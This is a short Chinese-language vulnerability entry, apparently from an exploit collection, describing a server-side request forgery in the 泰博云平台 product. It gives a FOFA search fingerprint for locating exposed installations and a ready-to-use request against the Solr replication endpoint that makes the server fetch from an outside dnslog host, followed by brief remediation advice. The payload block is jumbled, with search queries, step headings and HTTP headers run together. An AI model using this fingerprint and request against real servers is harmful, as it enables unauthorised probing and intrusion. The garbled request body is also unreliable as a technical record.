# 泰博云平台replicationSSRF

- **系统**：泰博云平台　|　**类型**：SSRF　|　**CVE**：—
- **指纹**：`title="泰博云平台"`
- **请求**：`POST /solr/collection1/replication/?command=fetchindex&masterUrl=http://xxxx.dnslog.cn HTTP/1.1`

**请求体 / payload**
```
1. Fofa
title="泰博云平台"
2、部分界面如下
3、隐患url,复现如下
Host: your-ip
Accept-Charset: utf-8
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。